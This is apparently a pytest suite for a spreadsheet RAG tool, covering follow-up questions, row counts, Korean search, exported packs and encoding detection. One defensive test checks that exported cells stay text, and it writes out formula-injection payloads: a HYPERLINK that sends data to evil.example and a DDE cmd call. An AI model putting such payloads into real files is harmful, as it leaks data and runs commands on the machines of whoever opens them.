"""RAG final round (lane k): follow-up direction and carry, row counts, ignored 'by' phrases,
Korean stems, web command phrases, formula cells in packs, hidden sheets and rows, and the
speed of legacy-encoding detection.

Expected figures are computed here with pandas from the rows written into the files.
"""
from __future__ import annotations

import io
import time
import zipfile

import openpyxl
import pandas as pd
import pytest

REG = ["East", "North", "South", "West"]
PROD = ["Widget", "Gadget"]
Q1 = pd.DataFrame([{"Region": REG[i % 4], "Product": PROD[(i // 4) % 2], "Revenue": 100 + (i * 37) % 211,
                    "Units": 1 + (i * 7) % 13} for i in range(40)])
Q2 = pd.DataFrame([{"Region": REG[i % 4], "Product": PROD[(i // 4) % 2], "Revenue": 200 + (i * 53) % 301,
                    "Units": 2 + (i * 5) % 11} for i in range(25)])


@pytest.fixture()
def space(tmp_path, monkeypatch):
    from rag import ingest, store

    root = tmp_path / "data"
    root.mkdir()
    monkeypatch.setattr(store, "RAG_DIR", root / "rag")
    monkeypatch.setattr(store, "DB_PATH", root / "rag" / "rag.db")
    monkeypatch.setattr(store, "BLOB_DIR", root / "rag")
    store.init()
    src = tmp_path / "files"
    src.mkdir()
    wb = openpyxl.Workbook()
    wb.remove(wb.active)
    for name, df in (("Q1", Q1), ("Q2", Q2)):
        ws = wb.create_sheet(name)
        ws.append(list(df.columns))
        for r in df.itertuples(index=False):
            ws.append(list(r))
    wb.save(src / "sales.xlsx")
    sp = store.create_space("T", depth_default="high")
    out = ingest.ingest_paths(int(sp["id"]), [src / "sales.xlsx"], force=True)
    assert out.get("ok"), out
    return int(sp["id"])


def ask(sid, q, history=None):
    from rag import answer

    done = None
    for ev in answer.answer_events(sid, q, use_llm=False, history=history if history is not None else []):
        if ev.get("type") == "done":
            done = ev
        if ev.get("type") == "error":
            raise AssertionError(ev)
    assert done is not None
    return done


def turn(history, q, done):
    history += [{"role": "user", "content": q},
                {"role": "assistant", "content": done.get("answer") or "", "provenance": done.get("provenance") or {}}]


def chat(sid, *qs):
    hist: list = []
    outs = []
    for q in qs:
        d = ask(sid, q, hist)
        turn(hist, q, d)
        outs.append(d)
    return outs


def nums(text):
    return text.replace(",", "")


# ---- fc-rag.0: the follow-up's own rank word decides the direction -------------------------

def test_lowest_after_highest_is_the_lowest(space):
    by = Q1.groupby("Region").Revenue.sum()
    d1, d2 = chat(space, "which region has the highest revenue in Q1", "and the lowest?")
    assert f"{by.idxmax()} has the highest" in d1["answer"]
    assert f"{by.idxmin()} has the lowest" in d2["answer"] and str(int(by.min())) in nums(d2["answer"])
    assert "highest" not in d2["answer"] and "minimum" not in d2["answer"]
    d3 = chat(space, "which region has the lowest revenue in Q1", "and the highest?")[1]
    assert f"{by.idxmax()} has the highest" in d3["answer"] and str(int(by.max())) in nums(d3["answer"])
    assert "lowest" not in d3["answer"] and "maximum" not in d3["answer"]


# ---- fc-rag.1: a new group-by or metric column is carried; a failed turn keeps the chain ----

def test_by_region_and_bare_column_follow_a_total(space):
    d1, d2 = chat(space, "total revenue in Q1", "by region")
    assert "not calculated" not in d2["answer"]
    for r, v in Q1.groupby("Region").Revenue.sum().items():
        assert f"{r}: {v}" in nums(d2["answer"])
    d3 = chat(space, "total revenue in Q1", "units?")[1]
    assert str(int(Q1.Units.sum())) in nums(d3["answer"]) and "not calculated" not in d3["answer"]
    d4 = chat(space, "total revenue in Q1", "by product", "and South?")[2]
    want = Q1[Q1.Region == "South"].groupby("Product").Revenue.sum()
    for pr, v in want.items():
        assert f"{pr}: {v}" in nums(d4["answer"])


def test_failed_followup_keeps_the_calculation_for_the_next(space):
    hist: list = []
    d1 = ask(space, "total revenue in Q1", hist)
    turn(hist, "total revenue in Q1", d1)
    # a follow-up nothing can calculate: said, and the chain is kept
    d2 = ask(space, "and what about the weather?", hist)
    assert d2["provenance"].get("followup_not_calculated")
    assert d2["provenance"].get("carry") == d1["provenance"]["carry"]
    turn(hist, "and what about the weather?", d2)
    d3 = ask(space, "and for South?", hist)
    assert d3.get("lane") == "sql", d3["answer"]
    assert str(int(Q1[Q1.Region == "South"].Revenue.sum())) in nums(d3["answer"])


# ---- fc-rag.2: a count of rows is COUNT(*), the same wherever it is asked ---------------------

@pytest.mark.parametrize("q", ["how many rows in Q1", "number of rows in Q1", "row count Q1", "count Q1 rows",
                               "how many rows are in the Q1 sheet"])
def test_row_count_first_and_later(space, q):
    d = ask(space, q)
    assert d.get("lane") == "sql" and "40" in d["answer"] and "COUNT(*)" in (d["provenance"].get("sql") or ""), d["answer"]
    later = chat(space, "total revenue in Q2", "what is the max revenue in Q2", q)[2]
    assert "40" in later["answer"] and "COUNT(*)" in (later["provenance"].get("sql") or ""), later["answer"]
    assert "COUNT(Revenue)" not in (later["provenance"].get("sql") or "")


def test_how_many_rows_are_there_reads_the_same_after_a_question(space):
    first = ask(space, "how many rows are there")["answer"]
    later = chat(space, "average revenue in Q2", "how many rows are there")[1]["answer"]
    assert "40" in later and "25" in later
    assert "40" in first and "25" in first


# ---- fc-rag.4: a 'by' with no column, in any wording; an ignored time is said ---------------

@pytest.mark.parametrize("q", ["total revenue by country in Q1", "revenue by country in Q1"])
def test_missing_by_column_is_said_in_every_wording(space, q):
    d = ask(space, q)
    assert "no country column" in d["answer"]
    assert str(int(Q1.Revenue.sum())) in nums(d["answer"])


@pytest.mark.parametrize("q,phrase", [("total revenue by next week in Q1", "by next week"),
                                      ("revenue by Monday in Q1", "by Monday"),
                                      ("revenue by 2024 in Q1", "by 2024")])
def test_ignored_time_phrase_is_said(space, q, phrase):
    d = ask(space, q)
    assert phrase in d["answer"] and "did not use" in d["answer"]
    assert str(int(Q1.Revenue.sum())) in nums(d["answer"])


def test_real_by_column_is_untouched(space):
    d = ask(space, "total revenue by region in Q1")
    assert "did not use" not in d["answer"] and "no region column" not in d["answer"]


# ---- fc-rag.5: the web command is stripped only at the start ---------------------------------

def test_web_command_only_at_the_start():
    from rag.answer import web_query_from_ask as w

    assert w("search the web for how to search the web") == "how to search the web"
    assert w("how to search the web") == "how to search the web"
    assert w("search the web for python") == "python"
    assert w("please search the internet for cats") == "cats"


# ---- fc-rag.3: Korean stems find their inflected forms ---------------------------------------

def test_korean_stem_finds_inflected_form(tmp_path, monkeypatch):
    from rag import answer, ingest, retrieve, store

    root = tmp_path / "d"
    root.mkdir()
    monkeypatch.setattr(store, "RAG_DIR", root / "rag")
    monkeypatch.setattr(store, "DB_PATH", root / "rag" / "rag.db")
    monkeypatch.setattr(store, "BLOB_DIR", root / "rag")
    store.init()
    sid = int(store.create_space("ko", depth_default="high")["id"])
    c = tmp_path / "c"
    c.mkdir()
    (c / "ko.txt").write_bytes("서울 창고에는 삼백이십 개의 팔레트가 있습니다. 담당자는 김민수이며 입출고를 관리합니다.\n".encode("euc_kr"))
    (c / "zh.txt").write_text("槟城的仓库有一百二十个托盘。负责人是李明。\n", encoding="utf-8")
    (c / "ja.txt").write_text("倉庫には四百パレットがあります。担当は田中です。\n", encoding="utf-8")
    (c / "de.txt").write_text("Das Lager in Hamburg hat 80 Paletten. Ansprechpartner ist Herr Schmidt.\n", encoding="utf-8")
    (c / "en.txt").write_text("The warehouse in Penang holds 120 pallets. The manager is Alice Tan.\n", encoding="utf-8")
    assert not ingest.ingest_paths(sid, sorted(c.iterdir())).get("skipped")
    for q in ("팔레트", "창고", "김민수"):
        hits = retrieve.search(sid, q, depth="high", top_k=10)["hits"]
        assert str(hits[0]["path"]).endswith("ko.txt"), (q, [h["path"] for h in hits])
        assert answer.unseen_terms_note(q, hits) == "", q
    # the other languages still find their own file first
    for q, f in (("托盘", "zh.txt"), ("パレット", "ja.txt"), ("Paletten", "de.txt"), ("pallets", "en.txt")):
        hits = retrieve.search(sid, q, depth="high", top_k=10)["hits"]
        assert str(hits[0]["path"]).endswith(f), (q, [h["path"] for h in hits])
    # a Korean word that is not there is still reported
    hits = retrieve.search(sid, "홍길동", depth="high", top_k=10)["hits"]
    assert "홍길동" in answer.unseen_terms_note("홍길동", hits)


# ---- cs.5: pack text starting with = + - @ stays text ----------------------------------------

def test_pack_cells_that_look_like_formulas_stay_text():
    from rag import export_import

    csv = ('A,B\n=HYPERLINK("http://evil.example/?x="&A1,"click"),=cmd|\' /C calc\'!A0\n'
           '=== Notes ===,+1+1\n@SUM(A1),-2+3\n-5,7\n').encode()
    data = export_import._build_workbook([("S", csv, {})])
    ws = openpyxl.load_workbook(io.BytesIO(data))["S"]
    for row in ws.iter_rows(min_row=2):
        for c in row:
            assert c.data_type != "f", (c.coordinate, c.value)
    assert ws["A3"].value == "=== Notes ==="
    assert ws["A2"].value.startswith("=HYPERLINK")
    assert ws["A5"].value == -5 and ws["B5"].value == 7  # real numbers stay numbers
    with zipfile.ZipFile(io.BytesIO(data)) as zf:
        assert b"<f>" not in zf.read("xl/worksheets/sheet1.xml")


# ---- cs.9: hidden sheets and rows are said ---------------------------------------------------

def test_hidden_sheets_and_rows_are_said_in_readme_and_notice(tmp_path, monkeypatch):
    from rag import export_import, ingest, store

    root = tmp_path / "d"
    root.mkdir()
    monkeypatch.setattr(store, "RAG_DIR", root / "rag")
    monkeypatch.setattr(store, "DB_PATH", root / "rag" / "rag.db")
    monkeypatch.setattr(store, "BLOB_DIR", root / "rag")
    store.init()
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "Open"
    ws.append(["Item", "Qty"])
    for i in range(1, 6):
        ws.append([f"i{i}", i])
    ws.row_dimensions[3].hidden = True
    sec = wb.create_sheet("Secret")
    sec.append(["Item", "Qty"])
    sec.append(["x", 9])
    sec.sheet_state = "hidden"
    f = tmp_path / "book.xlsx"
    wb.save(f)
    sid = int(store.create_space("h", depth_default="high")["id"])
    assert ingest.ingest_paths(sid, [f], force=True).get("ok")
    pack = export_import.export_space(sid, include_chats=False)
    zf = zipfile.ZipFile(io.BytesIO(pack))
    assert "hidden" in zf.read("README.txt").decode().lower()
    out = export_import.import_pack(pack, name="Copy")
    assert out["ok"] and "hidden" in out["notice"].lower() and "Secret" in out["notice"]
    # a book with nothing hidden gets no such notice
    wb2 = openpyxl.Workbook()
    wb2.active.append(["a", "b"])
    wb2.active.append([1, 2])
    f2 = tmp_path / "plain.xlsx"
    wb2.save(f2)
    sid2 = int(store.create_space("p", depth_default="high")["id"])
    assert ingest.ingest_paths(sid2, [f2], force=True).get("ok")
    out2 = export_import.import_pack(export_import.export_space(sid2, include_chats=False), name="Copy2")
    assert out2["ok"] and "hidden" not in (out2.get("notice") or "").lower()


# ---- cs.7: legacy-encoding detection on a 4 MB file is fast ----------------------------------

@pytest.mark.parametrize("name,raw", [
    ("x81", b"\x81" * 4_000_000),
    ("a4a1", b"\xa4\xa1" * 2_000_000),
    ("eucjp", "こんにちは世界".encode("euc_jp") * 400_000),
])
def test_four_megabyte_legacy_file_is_checked_fast(tmp_path, name, raw):
    from rag import ingest

    p = tmp_path / f"{name}.txt"
    p.write_bytes(raw)
    t = time.perf_counter()
    ingest.looks_binary(p)
    ingest.unreadable_reason(p)
    assert time.perf_counter() - t < 3.0


def test_legacy_korean_file_with_long_ascii_head_is_still_text(tmp_path):
    """The codec is scored on a sample; a 300 KB ASCII head must not hide the Korean after it."""
    from rag import ingest

    raw = b"id,name,note\n" * 25_000 + ("서울 창고에는 팔레트가 있습니다.\n" * 20_000).encode("cp949")
    p = tmp_path / "log.txt"
    p.write_bytes(raw)
    assert ingest.unreadable_reason(p) == ""
    text, _ = ingest.read_text_file(p)
    assert "창고에는 팔레트가" in text
